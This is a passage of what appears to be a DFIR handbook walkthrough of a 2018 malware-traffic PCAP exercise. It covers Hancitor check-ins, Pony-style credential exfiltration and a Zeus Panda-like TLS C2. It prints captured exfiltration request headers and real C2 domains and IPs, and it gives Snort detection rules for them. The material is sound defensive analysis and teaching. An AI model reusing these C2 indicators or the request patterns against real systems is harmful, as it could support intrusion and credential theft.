+<p><strong>Later replies:</strong> the 20 replies after 02:10:15 are all 12 bytes (e.g. <code>TGTGARRABw==</code>). The same recipe leaves <code>{n:}</code> at the end — "no new task, wait".</p>
+<h3 id="en-beacon-interval">3-4. Measuring the beacon interval</h3>
+<p>→ Sort the 21 results from 3-2 by <strong>Start Time</strong>.</p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>02:08:04  02:10:15  02:12:16  02:14:16  02:16:17  02:18:17  02:20:18
+02:22:18  02:24:19  02:26:19  02:28:20  02:30:20  02:32:21  02:34:21
+02:36:22  02:38:22  02:40:23  02:42:24  02:44:24  02:46:25  02:48:25
+</code></pre></div></div>
+<ul>
+<li>After the first check-in the gap is <strong>almost exactly 120.5 seconds</strong>. People are not that regular; this is a timer-driven <strong>automatic beacon</strong>.</li>
+<li>The body is identical every time (123 bytes, same GUID) and the reply is <code>{n:}</code>. <strong>The C2 was alive and waiting to issue the next task</strong> when the capture ended.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="en-exfil">Step 5 — Exfiltration: two binary POSTs</h2>
+<p><strong>Result:</strong> right after the downloads, <strong>a different program</strong> sent encrypted data to the same C2 server twice (206 + 234 bytes). The header shape matches how the Pony credential stealer uploads. The content is encrypted, so the traffic alone does not show what was taken.</p>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; http.request.content-type == application/octet-stream
+</code></pre></div></div>
+<ul>
+<li><code>http.request.content-type</code> — the type of the <strong>request</strong> body (what the PC sent). Clicking <code>application/octet-stream (2)</code> from step 3-1 and choosing <strong>and</strong> inserts it for you.</li>
+</ul>
+<p>→ <strong>Two</strong> sessions. Expand both and read the request headers.</p>
+<p><strong>Result:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>02:08:12  10.0.14.129:49200 -&gt; 185.43.223.6:80
+POST /mlu/forum.php HTTP/1.0
+Host: lysedsohap.com
+Accept: */*
+Accept-Encoding: identity, *;q=0
+Accept-Language: en-US
+Content-Length: 206
+Content-Type: application/octet-stream
+Connection: close
+Content-Encoding: binary
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; ...)
+
+(206 bytes of binary — unreadable)
+
+02:08:14  10.0.14.129:49202 -&gt; 185.43.223.6:80
+POST /d2/about.php HTTP/1.0
+... (same header shape)  Content-Length: 234
+</code></pre></div></div>
+<p><strong>Reading the result — compared with the check-ins (<a href="#en-checkin">step 3</a>):</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">Item</th>
+<th scope="col">Check-in <code>/4/forum.php</code></th>
+<th scope="col">These two POSTs</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>HTTP version</td>
+<td>1.1</td>
+<td><strong>1.0</strong></td>
+</tr>
+<tr>
+<td>User-Agent</td>
+<td>IE11 (<code>rv:11.0</code>)</td>
+<td><strong>MSIE 7.0</strong></td>
+</tr>
+<tr>
+<td>Body</td>
+<td>Readable <code>GUID=...</code></td>
+<td><strong>Encrypted binary</strong></td>
+</tr>
+<tr>
+<td>Unusual header</td>
+<td>None</td>
+<td><code>Content-Encoding: binary</code></td>
+</tr>
+<tr>
+<td>How often</td>
+<td>Every 2 minutes</td>
+<td><strong>Once each</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><strong>Same server, different program.</strong> The header habits are completely different. One of the files downloaded in step 4 most likely ran and sent these (right after the last download at 02:08:14).</li>
+<li><strong><code>Content-Encoding: binary</code> is not a standard HTTP value</strong> (standard ones are gzip, deflate, …). Odd headers like this act as a malware fingerprint and are good Snort material. This header combination plus the <code>MSIE 7.0</code> User-Agent is a known trait of the <strong>Pony</strong> credential stealer.</li>
+<li><strong>Sending once and stopping</strong> is typical too. Pony usually gathers passwords saved in browsers, email and FTP clients, uploads them in one go and exits.</li>
+<li><strong>The amount is small (440 bytes in total).</strong> There may have been few or no saved passwords. But <strong>since you cannot verify what left, treat it as stolen</strong> and recommend resetting faith.hoffman's password. In security, unknown means assume the worse.</li>
+<li>In the report, write the family as an assessment: "consistent with Pony – unconfirmed". In a closed network there was no hash lookup or sandbox to confirm it.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="en-tls-c2">Step 6 — TLS C2: robwassotdint[.]ru and a self-signed certificate</h2>
+<p><strong>Result:</strong> from 2 minutes after the downloads (02:10:16) the PC opened <strong>54 TLS sessions in bursts about every 5 minutes</strong> to <code>robwassotdint[.]ru</code> (185.174.175.14:443). The server used a <strong>self-signed certificate</strong> with OpenSSL defaults (<code>Default Company Ltd</code>), and the PC received about 1.65 MB. The content is encrypted, but the pattern matches a banking trojan's (Zeus Panda Banker-like) HTTPS C2.</p>
+<h3 id="en-tls-overview">6-1. All TLS at once</h3>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; protocols == tls
+</code></pre></div></div>
+<p>→ <strong>SPIView</strong> → <strong>tls</strong> and <strong>cert</strong> sections (Load All if hidden).</p>
+<p><strong>Result:</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Host (SNI)    robwassotdint.ru (54)   www.google.com (1)
+Dst IP        185.174.175.14 (54)   216.58.193.68 (1)
+Version       TLSv1.2 (55)
+Cipher        TLS_RSA_WITH_AES_128_CBC_SHA256 (54)   ...(google 1)
+Cert Issuer   Default Company Ltd / Default City / XX  (54)
+              Google Internet Authority G3 (1)
+Cert Subject  Default Company Ltd / Default City / XX  (54)
+              www.google.com (1)
+Not Before    2018-04-29 19:20:31   Not After  2023-10-20 19:20:31
+</code></pre></div></div>
+<ul>
+<li><strong>SNI</strong> — the "site I want" name the PC sends <strong>in clear text before encryption</strong> when starting TLS. The content is encrypted; the name is not. Arkime puts the SNI in its host fields, so <code>host == robwassotdint.ru</code> finds it too.</li>
+<li><strong>Issuer</strong> — who vouched for the certificate. <strong>Subject</strong> — whose certificate it is.</li>
+</ul>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>Issuer and Subject are identical = self-signed.</strong> The server made its own certificate, which a browser would warn about. Legitimate sites use a public CA's certificate, like Google's here.</li>
+<li><strong><code>Default Company Ltd</code>, <code>Default City</code>, country <code>XX</code></strong> — the <strong>defaults</strong> OpenSSL fills in when you just press Enter at every prompt. Common on servers that attackers set up in a hurry. (The <code>Internet Widgits</code> certificate in the <a href="handbook-icedid-tds-gzip-loader-backconnect.html">IcedID case</a> is the same kind of thing.)</li>
+<li><strong>The certificate has no domain name.</strong> The SNI is robwassotdint[.]ru but the certificate has no CN and no such name. Legitimate certificates match.</li>
+<li><strong>Issued 2018-04-29</strong> — a brand-new certificate, 12 days before the capture. Fresh infrastructure is another warning sign.</li>
+<li>Seeing the certificate in clear text is a TLS 1.2-era feature. In TLS 1.3 the certificate is encrypted too.</li>
+</ul>
+<h3 id="en-tls-pattern">6-2. The connection pattern</h3>
+<p><strong>Query:</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>ip.src == 10.0.14.129 &amp;&amp; ip.dst == 185.174.175.14
+</code></pre></div></div>
+<p>→ Sort the <strong>Sessions</strong> tab by <strong>Start Time</strong> and look at the <strong>Dst Bytes</strong> column. The bar chart at the top (session count over time) also follows this query.</p>
+<p><strong>Result (sessions per burst):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>Burst start   Sessions   Notes
+02:10:16          4
+02:15:20          4
+02:20:16          6
+02:25:27          4
+02:30:18          6
+02:35:35          4
+02:40:16         14       large downloads here: 159 – 206 KB per session
+02:42:27          8       up to 524 KB and 421 KB per session
+02:45:43          4
+Total            54       ~120 KB sent / ~1.65 MB received
+</code></pre></div></div>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>Bursts roughly every 5 minutes.</strong> Sessions come in pairs, and the small ones receive an almost identical 1,442 bytes. A machine-driven <strong>beacon</strong>.</li>
+<li><strong>Large sessions cluster at 02:40–02:42.</strong> The beaconing C2 most likely pushed a configuration file or extra modules. Banking trojans receive "which bank sites to inject fake input fields into" (webinjects) this way.</li>
+<li><strong>Far less sent (120 KB) than received (1.65 MB).</strong> No large exfiltration is visible, but because it is encrypted, a small one (passwords and so on) cannot be ruled out.</li>
+<li><strong>It starts right after the step 4 downloads.</strong> At 02:10:16 the PC asked the DC (10.0.14.3) for robwassotdint[.]ru and connected to the answer, 185.174.175.14, straight away. It had never asked for that name before the downloads. Hence "a downloaded file ran and joined a new C2".</li>
+<li>The single <code>www.google.com</code> TLS session (02:20:16) has Google's genuine certificate and happens once, so it stays out of the report. Keep it in your analysis notes in case the host side needs it.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="en-timeline">Step 7 — Timeline: putting the events in order</h2>
+<p><strong>Result:</strong> malicious activity started <strong>35 seconds</strong> after the user logged on, and the check-in, downloads and exfiltration were all done <strong>within about 11 seconds</strong>. Both C2 channels were still alive when the capture ended. All times are 2018-05-11 UTC.</p>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">Time (UTC)</th>
+<th scope="col">Event</th>
+<th scope="col">Evidence (Arkime)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>02:06:51</td>
+<td>PC start-up / network join, DHCP REQUEST (0.0.0.0 → broadcast)</td>
+<td><code>protocols == dhcp</code></td>
+</tr>
+<tr>
+<td>02:07:02</td>
+<td>Windows connectivity check (msftncsi) — normal</td>
+<td><code>host.http == www.msftncsi.com</code></td>
+</tr>
+<tr>
+<td>02:07:29</td>
+<td><strong>faith.hoffman logs on</strong> (Kerberos)</td>
+<td><code>protocols == krb5</code></td>
+</tr>
+<tr>
+<td>02:08:04</td>
+<td><strong>Public IP check at api.ipify[.]org</strong> → 0.5 s later <strong>first lysedsohap[.]com check-in</strong> (download commands received)</td>
+<td><code>host.http == lysedsohap.com</code></td>
+</tr>
+<tr>
+<td>02:08:05 – 02:08:15</td>
+<td><strong>Three encrypted files downloaded from wansaiful[.]com</strong></td>
+<td><code>host.http == wansaiful.com</code></td>
+</tr>
+<tr>
+<td>02:08:12, 02:08:14</td>
+<td><strong>Two encrypted POSTs</strong> to <code>/mlu/forum.php</code> and <code>/d2/about.php</code> (likely credential exfil)</td>
+<td><code>http.request.content-type == application/octet-stream</code></td>
+</tr>
+<tr>
+<td>02:10:15</td>
+<td>lysedsohap[.]com check-ins resume, then about every 2 min (<code>{n:}</code> = wait)</td>
+<td>same query</td>
+</tr>
+<tr>
+<td>02:10:16</td>
+<td><strong>First DNS query for robwassotdint[.]ru → first TLS session</strong></td>
+<td><code>host == robwassotdint.ru</code></td>
+</tr>
+<tr>
+<td>02:10 – 02:45</td>
+<td>TLS beacon about every 5 min, 54 sessions in total</td>
+<td><code>ip.dst == 185.174.175.14</code></td>
+</tr>
+<tr>
+<td>02:40 – 02:42</td>
+<td><strong>Large downloads from the TLS C2</strong> (up to 524 KB per session)</td>
+<td>Dst Bytes column</td>
+</tr>
+<tr>
+<td>02:45:46</td>
+<td>Last TLS C2 session starts</td>
+<td>—</td>
+</tr>
+<tr>
+<td>02:48:25</td>
+<td>Last lysedsohap[.]com check-in (capture ends 02:49:40)</td>
+<td>—</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p><strong>Reading the result:</strong></p>
+<ul>
+<li><strong>Initial access is not in this PCAP.</strong> There is no email, document download or Office traffic. In the previous case Office DNS lookups came just before the EXE download; there is no such clue here.</li>
+<li><strong>Two possibilities:</strong> ① the PC was already infected before the capture and the malware auto-started at logon (persistence); ② the user opened an already-downloaded document right after logon. Starting 35 s after logon leans towards ①, but traffic alone cannot tell them apart.</li>
+<li>So the report says "initial access unconfirmed, host confirmation required" and lists where the host operator should look (Run keys, scheduled tasks, recently opened documents, email attachments).</li>
+<li><strong>No other internal PC in the capture.</strong> But see the correction below: the DC traffic hides password guessing.</li>
+</ul>
+<p><code>Not Found</code> is a result too. Recording "looked, not in the traffic" saves the next analyst from searching again.</p>
+<hr>
+</section>
+<section>
+<h2 id="en-snort">Step 8 — Snort rules and test results</h2>
+<p><strong>Result:</strong> tested against the PCAP, all 8 rules fired <strong>exactly the number of times written down in advance</strong>, and none fired on normal traffic (DC, Google, msftncsi). (Snort 2.9.20, <code>HOME_NET 10.0.14.0/24</code>)</p>
+<h3 id="en-snort-rules">The rules</h3>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Snort</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor-style check-in POST to /4/forum.php - Sung"; flow:to_server,established; content:"POST"; http_method; content:"/4/forum.php"; http_uri; content:"GUID="; http_client_body; depth:5; content:"&amp;BUILD="; http_client_body; distance:0; content:"&amp;INFO="; http_client_body; distance:0; classtype:trojan-activity; sid:1000011; rev:1;)
+
+alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"Hancitor follow-up payload download from wansaiful.com - Sung"; flow:to_server,established; content:"GET"; http_method; content:"/wp-content/plugins/easy-media-download/"; http_uri; content:"wansaiful.com"; http_header; classtype:trojan-activity; sid:1000012; rev:1;)
+
+alert tcp $HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS (msg:"Pony-style credential exfil POST with Content-Encoding binary - Sung"; flow:to_server,established; content:"POST"; http_method; content:"Content-Type|3a| application/octet-stream"; http_header; content:"Content-Encoding|3a| binary"; http_header; classtype:trojan-activity; sid:1000013; rev:1;)
+
+alert tcp $HOME_NET any -&gt; $EXTERNAL_NET 443 (msg:"TLS Client Hello SNI robwassotdint.ru (Zeus Panda C2) - Sung"; flow:to_server,established; content:"|16 03|"; depth:2; content:"|01|"; offset:5; depth:1; content:"robwassotdint.ru"; nocase; classtype:trojan-activity; sid:1000014; rev:1;)
+
+alert tcp $EXTERNAL_NET 443 -&gt; $HOME_NET any (msg:"TLS certificate with OpenSSL default subject Default Company Ltd from external server - Sung"; flow:to_client,established; content:"Default Company Ltd"; classtype:bad-unknown; sid:1000015; rev:1;)
+
+alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for Hancitor C2 lysedsohap.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0a|lysedsohap|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000016; rev:1;)
+
+alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for Zeus Panda C2 robwassotdint.ru - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|0d|robwassotdint|02|ru|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000017; rev:1;)
+
+alert udp $HOME_NET any -&gt; any 53 (msg:"DNS query for Hancitor payload host wansaiful.com - Sung"; content:"|01 00 00 01 00 00 00 00 00 00|"; offset:2; depth:10; content:"|09|wansaiful|03|com|00|"; nocase; distance:0; classtype:trojan-activity; sid:1000018; rev:1;)
+</code></pre></div></div>
+<h3 id="en-rule-anatomy">One rule taken apart (sid 1000011)</h3>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">Part</th>
+<th scope="col">Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>alert tcp</code></td>
+<td>Inspect TCP packets; alert on a match</td>
+</tr>
+<tr>
+<td><code>$HOME_NET any -&gt; $EXTERNAL_NET $HTTP_PORTS</code></td>
+<td>Any internal port → external web ports (80 etc.). Direction matters</td>
+</tr>
+<tr>
+<td><code>flow:to_server,established</code></td>
+<td>Only data going to the server on an established TCP connection</td>
+</tr>
+<tr>
+<td><code>content:"POST"; http_method</code></td>
+<td>The HTTP method is POST</td>
+</tr>
+<tr>
+<td><code>content:"/4/forum.php"; http_uri</code></td>
+<td>The URI contains <code>/4/forum.php</code></td>
+</tr>
+<tr>
+<td><code>content:"GUID="; http_client_body; depth:5</code></td>
+<td>The <strong>first 5 bytes of the request body</strong> are <code>GUID=</code></td>
+</tr>
+<tr>
+<td><code>content:"&amp;BUILD="; ... distance:0</code></td>
+<td><code>&amp;BUILD=</code> somewhere after that (<code>distance:0</code> = search from where the previous match ended)</td>
+</tr>
+<tr>
+<td><code>content:"&amp;INFO="</code></td>
+<td>Then <code>&amp;INFO=</code></td>
+</tr>
+<tr>
+<td><code>classtype:trojan-activity</code></td>
+<td>Category: trojan activity</td>
+</tr>
+<tr>
+<td><code>sid:1000011; rev:1</code></td>
+<td>Rule number (local rules use 1000000+) and revision</td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li><strong>Why not just the URI?</strong> <code>/4/forum.php</code> could exist on a real forum. Matching the body's <code>GUID=...&amp;BUILD=...&amp;INFO=</code> structure cuts false positives and still catches the malware if the attacker changes domains.</li>
+<li><strong>sid 1000013</strong> looks only at the odd header combination (<code>octet-stream</code> + <code>Content-Encoding: binary</code>), with no domain or URI. <strong>Behaviour rules</strong> like this can catch the same malware talking to other servers.</li>
+<li><strong>sid 1000014</strong> reads the SNI name inside the TLS Client Hello (<code>|16 03|</code> = TLS handshake, sixth byte <code>|01|</code> = Client Hello). It is visible because it is sent before encryption.</li>
+<li><strong>sid 1000015</strong> looks the other way (server → PC) for <code>Default Company Ltd</code> in the certificate. It is not malware-only (test servers do this too), so the category is lowered to <code>bad-unknown</code>.</li>
+<li>In the DNS rules (1000016–1000018), <code>|01 00 00 01 00 00 00 00 00 00|</code> is the DNS header for "standard query, 1 question, 0 answers", so they match <strong>questions</strong> only, not answers. <code>|0a|lysedsohap|03|com|00|</code> is how DNS stores names (length + label): <code>0a</code> = 10-letter <code>lysedsohap</code>, <code>03</code> = 3-letter <code>com</code>, <code>00</code> = end.</li>
+</ul>
+<h3 id="en-snort-test">Testing</h3>
+<div class="language-bash highlight"><div class="query-block"><pre tabindex="0"><code>sudo snort -T -c /etc/snort/snort.conf
+sudo snort -c /etc/snort/snort.conf -r 2018-05-11-traffic-analysis-exercise.pcap -A console -q -k none -U -l /tmp/snorttest | grep -o "\[1:[0-9]*:[0-9]*\] [^[]*" | sort | uniq -c
+</code></pre></div></div>
+<ul>
+<li><code>-T</code> — check the configuration and rule syntax only. <code>-r</code> — read a PCAP file. <code>-A console</code> — print alerts to the screen. <code>-q</code> — quiet. <code>-k none</code> — also inspect packets with bad checksums (common in capture files). <code>-U</code> — UTC timestamps.</li>
+<li><code>grep | sort | uniq -c</code> — counts alerts per sid.</li>
+</ul>
+<p><strong>Result (against the expected counts):</strong></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="Evidence table"><table>
+<thead>
+<tr>
+<th scope="col">sid</th>
+<th scope="col">Rule</th>
+<th scope="col">Expected</th>
+<th scope="col">Actual</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1000011</td>
+<td>Hancitor check-in</td>
+<td>21 (<code>/4/forum.php</code> POSTs)</td>
+<td><strong>21</strong></td>
+</tr>
+<tr>
+<td>1000012</td>
+<td>wansaiful.com download</td>
+<td>3 (3 requests)</td>
+<td><strong>3</strong></td>
+</tr>
+<tr>
+<td>1000013</td>
+<td>Pony-style exfil POST</td>
+<td>2</td>
+<td><strong>2</strong></td>
+</tr>
+<tr>
+<td>1000014</td>
+<td>SNI robwassotdint.ru</td>
+<td>54 (TLS sessions)</td>
+<td><strong>54</strong></td>
+</tr>
+<tr>
+<td>1000015</td>
+<td><code>Default Company Ltd</code> certificate</td>
+<td>54</td>
+<td><strong>54</strong></td>
+</tr>
+<tr>
+<td>1000016</td>
+<td>DNS lysedsohap.com</td>
+<td>2 (query packets)</td>
+<td><strong>2</strong></td>
+</tr>
+<tr>
+<td>1000017</td>
+<td>DNS robwassotdint.ru</td>
+<td>2</td>
+<td><strong>2</strong></td>
+</tr>
+<tr>
+<td>1000018</td>
+<td>DNS wansaiful.com</td>
+<td>1</td>
+<td><strong>1</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<ul>
+<li>Count the expected numbers in Arkime (or tshark) <strong>before</strong> running the rules. More than expected means false positives; fewer means misses — fix the rule.</li>
+<li>Check also that sid 1000011 shows 21, not 23. The two Pony POSTs to the same server do not start with <code>GUID=</code> and must be excluded.</li>
+</ul>
+<hr>
+</section>
+<section>
+<h2 id="en-query-sheet">Copy-ready queries</h2>
+<p><strong>Arkime</strong></p>
+<div class="language-text highlight"><div class="query-block"><div class="query-bar"><span class="query-type">Arkime</span><span class="query-status" role="status" data-copy-status></span><button class="query-copy" type="button" data-copy-query data-copy="copyQuery">Copy query</button></div><pre tabindex="0"><code>protocols == dhcp
+protocols == krb5
+protocols == dns
+protocols == http
+protocols == tls
+ip.src == 10.0.14.129 &amp;&amp; ip.dst != [10.0.0.0/8, 224.0.0.0/4, 255.255.255.255]
+ip.src == 10.0.14.129 &amp;&amp; host.http == lysedsohap.com
+ip.src == 10.0.14.129 &amp;&amp; host.http == lysedsohap.com &amp;&amp; http.uri == *4/forum.php*
+ip.src == 10.0.14.129 &amp;&amp; host.http == wansaiful.com
+ip.src == 10.0.14.129 &amp;&amp; host.http == api.ipify.org
+ip.src == 10.0.14.129 &amp;&amp; http.request.content-type == application/octet-stream
+ip.src == 10.0.14.129 &amp;&amp; host.dns == [lysedsohap.com, wansaiful.com]
+ip.src == 10.0.14.129 &amp;&amp; ip.dst == 185.174.175.14
+ip.src == 10.0.14.129 &amp;&amp; ip.dst == 185.174.175.14 &amp;&amp; port.dst == 443
+host == robwassotdint.ru
+host.dns == robwassotdint.ru
+cert.issuer.on == "Default Company Ltd"
+</code></pre></div></div>
+<p><strong>CyberChef (Hancitor C2 reply)</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>From Base64  →  XOR (Key: 7a, HEX)
+</code></pre></div></div>
+<p><strong>Analysis VM</strong></p>
+<div class="language-bash highlight"><div class="query-block"><pre tabindex="0"><code>TZ=UTC capinfos 2018-05-11-traffic-analysis-exercise.pcap
+sha256sum 2018-05-11-traffic-analysis-exercise.pcap
+tshark -r 2018-05-11-traffic-analysis-exercise.pcap --export-objects http,http_objects
+sha256sum http_objects/*
+</code></pre></div></div>
+<hr>
+</section>
+<section>
+<h2 id="en-lessons">Lessons</h2>
+<ol>
+<li><strong>In a domain, Kerberos names the user.</strong> A trailing <code>$</code> means a computer account; no <code>$</code> means a person. Here the malware's own <code>INFO=</code> field confirmed the same user.</li>
+<li><strong>Legitimate services can be part of malicious activity.</strong> api.ipify[.]org itself is fine, but its answer went to the C2 half a second later. What happened just before and after matters more than the destination alone.</li>
+<li><strong>Beacons show themselves through intervals.</strong> About 120 s for HTTP, about 5-minute bursts for TLS. Sort the Sessions tab by Start Time and list the times.</li>
+<li><strong>Encryption still leaves patterns and metadata.</strong> Without seeing TLS content, SNI, a default self-signed certificate, the interval and the byte counts were enough to call it C2.</li>
+<li><strong>Do not trust Content-Type.</strong> The <code>text/plain</code> files were encrypted binaries. Note in the report that network hashes may differ from on-disk hashes.</li>
+<li><strong>Same server, different header habits = different program.</strong> HTTP 1.1 vs 1.0, User-Agent and <code>Content-Encoding: binary</code> separated the check-ins from the exfiltration.</li>
+<li><strong>Follow the infection chain.</strong> Downloader (Hancitor) → commands → downloads → next-stage malware (info stealer, banking trojan). The first new destination after a download is almost always the next stage.</li>
+<li><strong>Record what you could not find.</strong> Initial access was not in the PCAP. "Not Found + where to look on the host" hands it to the host operator.</li>
+</ol>
+</section>
+<section>
+<h2 id="en-references">References</h2>
+<ul>
+<li><a href="https://dfidwiz-sketch.github.io/dfir-handbook/network/arkime/search-syntax/">Arkime search syntax</a> · <a href="https://dfidwiz-sketch.github.io/dfir-handbook/network/arkime/offline-pcap-guide/">Analysing a PCAP with Arkime</a></li>
+<li><a href="https://dfidwiz-sketch.github.io/dfir-handbook/network/beaconing-c2/">Beaconing &amp; C2</a> · <a href="https://dfidwiz-sketch.github.io/dfir-handbook/network/wireshark-tshark/">Wireshark &amp; tshark</a></li>
+<li><a href="handbook-pcap-lab-06-invoice-macro-c2.html">PCAP Lab 06 — Invoice Word macro to Hancitor-style C2</a> · <a href="handbook-back-to-the-present-chthonic-c2-tech-support-scam.html">Back to the Present</a> · <a href="handbook-icedid-tds-gzip-loader-backconnect.html">IcedID (Cold as Ice)</a></li>
+<li><a href="https://dfidwiz-sketch.github.io/dfir-handbook/blueteam/playbooks/compromised-workstation/">Playbook: compromised workstation</a></li>
+<li>Original exercise: <a href="https://malware-traffic-analysis.net/2018/05/11/index.html">malware-traffic-analysis.net — 2018-05-11 Traffic Analysis Exercise: Night Dew</a> · <a href="https://malware-traffic-analysis.net/2018/05/11/page2.html">answers page</a></li>
+<li>Hancitor + Zeus Panda Banker infection from the same week: <a href="https://malware-traffic-analysis.net/2018/05/14/index.html">malware-traffic-analysis.net — 2018-05-14</a></li>
+<li>Public list naming the same C2 URLs (<code>/4/forum.php</code>, <code>/mlu/forum.php</code>, <code>/d2/about.php</code>) as Hancitor/Pony C2: Pastebin — HANCITOR</li>
+</ul>
+</section>
+</div>
+<div lang="ko" data-guide-language hidden>
+<section id="ko-summary"><h2>사례 요약</h2><p>첫 번째 분석은 HTTP 체크인, 후속 파일 전송, 자체 서명 인증서를 사용한 TLS 통신을 추적합니다. 연결된 Traffic Analysis 가이드에서 별도 Netlogon RPC 요청이 집중된 시점과 그 뒤 TCP 연결이 종료된 시점을 확인할 수 있습니다.</p>
+<p><a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/blueteam/investigations/night-dew-hancitor-pony-zeus-panda-tls-c2/">DFIR Handbook 원문</a></p>
+<p><a href="2018-05-11-night-dew-netlogon-rpc.html">Traffic Analysis · Night Dew Netlogon 패킷 시각</a></p>
+<div class="guide-table" tabindex="0" role="region" aria-label="근거 표"><table>
+<thead>
+<tr>
+<th scope="col"></th>
+<th scope="col"></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>증거</strong></td>
+<td>PCAP 1개 <code>2018-05-11-traffic-analysis-exercise.pcap</code> — 2018-05-11 02:06:51 – 02:49:40 UTC (42분 49초), 패킷 7,295개, SHA256 <code>b2c8d0fe…13e51e</code></td>
+</tr>
+<tr>
+<td><strong>출처</strong></td>
+<td>malware-traffic-analysis.net 2018-05-11 실습 "Night Dew"</td>
+</tr>
+<tr>
+<td><strong>환경</strong></td>
+<td>폐쇄망(VirusTotal, OSINT 불가). Arkime 웹 화면, CyberChef, 분석 VM의 tshark와 Snort 2.9</td>
+</tr>
+<tr>
+<td><strong>결과물</strong></td>
+<td>베이스라인, 악성 활동 분석, CyberChef 디코드, 트래픽을 다시 찾는 Snort 룰(테스트 완료)</td>
+</tr>
+<tr>
+<td><strong>관련 페이지</strong></td>
+<td><a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/network/arkime/search-syntax/">Arkime 검색 문법</a> · <a href="https://dfidwiz-sketch.github.io/dfir-handbook/ko/network/beaconing-c2/">비콘과 C2</a> · <a href="handbook-pcap-lab-06-invoice-macro-c2.html">PCAP 실습 06 — 같은 Hancitor 유형</a> · <a href="handbook-back-to-the-present-chthonic-c2-tech-support-scam.html">앞의 사례: Back to the Present</a></td>
+</tr>
+</tbody>
+</table>
+</div>
+</section>
+<section>
+<h2 id="ko-answers">한눈에 보는 답</h2>
+<p><strong>결론:</strong> 2018-05-11 02:08:04 UTC부터 CHICAGO-7FA3-PC(10.0.14.129, 사용자 faith.hoffman)가 Hancitor 유형 다운로더에 감염돼 있었습니다. 이 PC는 C2에 2분마다 체크인했고, 추가 악성코드 3개를 받았고, 비밀번호를 훔쳐 보낸 것으로 보이는 POST를 2번 보냈어요. 그 뒤 Zeus Panda Banker 유형의 HTTPS C2에 5분마다 접속했습니다.</p>
+<hr>
+</section>
+<section>
+<h2 id="ko-prep">0단계 — 준비: PCAP과 Arkime 시간 범위</h2>
+<p><strong>목적:</strong> 무엇을 분석하는지 기록하고, Arkime가 PCAP 전체를 보여 주는지 확인합니다.</p>
+<p><strong>과제 시나리오:</strong> 2018-05-11(금, UTC)에 감염이 의심되는 Windows 호스트 알림이 왔고, 동료가 관련 트래픽을 가져왔습니다. 트래픽을 분석해서 인시던트 리포트(보고서)를 씁니다.</p>
+<p><strong>PCAP 정보 (분석 VM에서 <code>capinfos</code>, <code>sha256sum</code>):</strong></p>
+<div class="language-text highlight"><div class="query-block"><pre tabindex="0"><code>File        2018-05-11-traffic-analysis-exercise.pcap
+SHA256      b2c8d0fed6765dc4d2036fae6587a3bac9c27184a3032bd3899eefac4d13e51e
+Packets     7295
+First       2018-05-11 02:06:51 UTC
+Last        2018-05-11 02:49:40 UTC
+Duration    약 42분 49초
+</code></pre></div></div>
+<ul>
+<li>해시는 "내가 분석한 파일이 바로 이 파일"이라는 증거예요. 보고서의 증거 위치와 함께 적어 두면 다음 사람이 같은 파일인지 확인할 수 있습니다.</li>
